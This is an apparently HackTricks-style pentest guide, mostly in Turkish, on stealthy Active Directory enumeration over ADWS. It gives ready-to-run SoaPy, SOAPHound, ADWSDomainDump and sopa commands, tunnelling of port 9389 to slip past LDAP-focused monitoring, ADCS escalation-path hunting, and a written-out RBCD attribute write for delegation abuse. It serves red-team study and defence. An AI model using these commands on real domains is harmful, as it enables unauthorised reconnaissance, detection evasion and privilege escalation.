# Active Directory Web Services (ADWS) Dizinleme ve Gizli Toplama

{{#include ../../banners/hacktricks-training.md}}

## ADWS nedir?

Active Directory Web Services (ADWS) Windows Server 2008 R2'den beri her Domain Controller'da varsayılan olarak **etkinleştirilmiştir** ve TCP **9389** üzerinde dinler. İsim yanıltıcı olsa da, **HTTP kullanılmaz**. Bunun yerine, hizmet LDAP tarzı veriyi özel .NET çerçeve protokolleri yığını aracılığıyla açığa çıkarır:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Bu trafik bu ikili SOAP çerçeveleri içinde kapsüllenip nadir kullanılan bir port üzerinden gittiği için, **ADWS üzerinden yapılan keşfin klasik LDAP/389 & 636 trafiğine kıyasla incelenme, filtrelenme veya imza tabanlı tespit edilme olasılığı çok daha düşüktür**. Operatörler için bunun anlamı:

* Daha gizli keşif – Blue team'ler genellikle LDAP sorgularına odaklanır.
* 9389/TCP'yi bir SOCKS proxy üzerinden tünelleyerek **Windows olmayan sistemler (Linux, macOS)**'dan veri toplayabilme özgürlüğü.
* LDAP üzerinden elde edeceğiniz aynı veriler (users, groups, ACLs, schema, vb.) ve **yazma** işlemleri yapabilme yeteneği (ör. `msDs-AllowedToActOnBehalfOfOtherIdentity` for **RBCD**).

ADWS etkileşimleri WS-Enumeration üzerinde uygulanır: her sorgu LDAP filtre/özniteliklerini tanımlayan bir `Enumerate` mesajı ile başlar ve bir `EnumerationContext` GUID döner, ardından sunucu tarafından tanımlanan sonuç penceresine kadar stream yapan bir veya daha fazla `Pull` mesajı gelir. Context'ler yaklaşık 30 dakika sonra süresi dolar, bu yüzden araçların sonuçları sayfalandırması ya da durumu kaybetmemek için filtreleri bölmesi (her CN için önek sorguları) gerekir. Güvenlik descriptor'larını isterken, SACL'leri atlamak için `LDAP_SERVER_SD_FLAGS_OID` kontrolünü belirtin, aksi halde ADWS SOAP yanıtından `nTSecurityDescriptor` özniteliğini basitçe çıkarır.

> NOTE: ADWS birçok RSAT GUI/PowerShell aracı tarafından da kullanıldığından, trafik meşru admin faaliyetleriyle karışabilir.

## SoaPy – Native Python İstemcisi

[SoaPy](https://github.com/logangoins/soapy) saf Python'da ADWS protokol yığınının **tam yeniden-implementasyonudur**. NBFX/NBFSE/NNS/NMF çerçevelerini byte-by-byte oluşturur, .NET runtime'a dokunmadan Unix-benzeri sistemlerden veri toplanmasına olanak sağlar.

### Temel Özellikler

* SOCKS üzerinden **proxyleme** desteği (C2 implantlarından kullanışlı).
* LDAP `-q '(objectClass=user)'` ile özdeş ince taneli arama filtreleri.
* İsteğe bağlı **yazma** işlemleri ( `--set` / `--delete` ).
* BloodHound'a doğrudan alınmak üzere **BOFHound output mode**.
* İnsan okunurluğu gerektiğinde zaman damgalarını / `userAccountControl`'ü güzelleştirmek için `--parse` bayrağı.

### Hedefe yönelik toplama bayrakları & yazma işlemleri

SoaPy, ADWS üzerinde en yaygın LDAP avcılık görevlerini yeniden üreten küratörlü anahtarlarla gelir: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, artı özel çekmeler için ham `--query` / `--filter` düğmeleri. Bunları `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) ve `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`) gibi yazma ilkelikleriyle eşleştirin.

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Aynı host/credentials'i kullanarak bulguları hemen weaponise edin: RBCD-capable nesneleri dump etmek için `--rbcds` kullanın, ardından bir Resource-Based Constrained Delegation zincirini stage etmek için `--rbcd 'WEBSRV01$' --account 'FILE01$'` uygulayın (tam kötüye kullanım yolu için bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Kurulum (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump`'in fork'udur; LDAP sorgularını ADWS çağrılarına TCP/9389 üzerinden değiştirerek LDAP-signature hits'i azaltır.
* `--force` verilmedikçe 9389'a ilk erişilebilirlik kontrolü yapar (port scans gürültülü/filtreliyse probe'ı atlar).
* Microsoft Defender for Endpoint ve CrowdStrike Falcon üzerinde test edilmiş olup, README'de başarılı bir bypass gösterilmektedir.

### Kurulum
```bash
pipx install .
```
### Kullanım
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipik çıktı, 9389 erişilebilirlik kontrolünü, ADWS bind'ini ve dump başlangıç/bitişini kaydeder:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang'da ADWS için pratik bir istemci

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Nesne arama ve alma** - `query` / `get`
* **Nesne yaşam döngüsü** - `create [user|computer|group|ou|container|custom]` ve `delete`
* **Öznitelik düzenleme** - `attr [add|replace|delete]`
* **Hesap yönetimi** - `set-password` / `change-password`
* ve `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` gibi diğerleri.

## SOAPHound – Yüksek Hacimli ADWS Toplama (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is a .NET collector that keeps all LDAP interactions inside ADWS and emits BloodHound v4-compatible JSON. It builds a complete cache of `objectSid`, `objectGUID`, `distinguishedName` and `objectClass` once (`--buildcache`), then re-uses it for high-volume `--bhdump`, `--certdump` (ADCS), or `--dnsdump` (AD-integrated DNS) passes so only ~35 critical attributes ever leave the DC. AutoSplit (`--autosplit --threshold <N>`) automatically shards queries by CN prefix to stay under the 30-minute EnumerationContext timeout in large forests.

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Dışa aktarılan JSON'lar doğrudan SharpHound/BloodHound iş akışlarına aktarılabilir — sonraki grafik fikirleri için [BloodHound methodology](bloodhound.md) bakın. AutoSplit, SOAPHound'u milyonlarca nesneli ormanlarda dayanıklı hale getirir ve sorgu sayısını ADExplorer-style snapshots ile kıyaslandığında daha düşük tutar.

## Gizli AD Toplama İş Akışı

Aşağıdaki iş akışı, ADWS üzerinden **domain & ADCS objects** nasıl enumerate edileceğini, bunların BloodHound JSON'a nasıl dönüştürüleceğini ve sertifika tabanlı saldırı yollarının nasıl aranacağını — tümü Linux'tan — gösterir:

1. **Tunnel 9389/TCP** hedef ağdan kendi makinenize tünelleyin (örn. Chisel, Meterpreter, SSH dynamic port-forward vb.). `export HTTPS_PROXY=socks5://127.0.0.1:1080` ortam değişkenini ayarlayın veya SoaPy’s `--proxyHost/--proxyPort` seçeneklerini kullanın.

2. **Kök domain nesnesini toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC'den ADCS ile ilgili nesneleri toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound'a dönüştür:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP'i yükleyin** BloodHound GUI'de ve `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırın; bunlar sertifika yükseltme yollarını (ESC1, ESC8, vb.) ortaya çıkarır.

### Yazma `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Tam bir **Resource-Based Constrained Delegation** zinciri için bunu `s4u2proxy`/`Rubeus /getticket` ile birleştirin (bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Araç Özeti

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch günlüklerini dönüştürür |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Aynı SOCKS üzerinden yönlendirilebilir |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Bilinen ADWS uç noktalarıyla arayüz kurmak için genel bir client - allows for enumeration, object creation, attribute modifications, and password changes |

## Referanslar

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
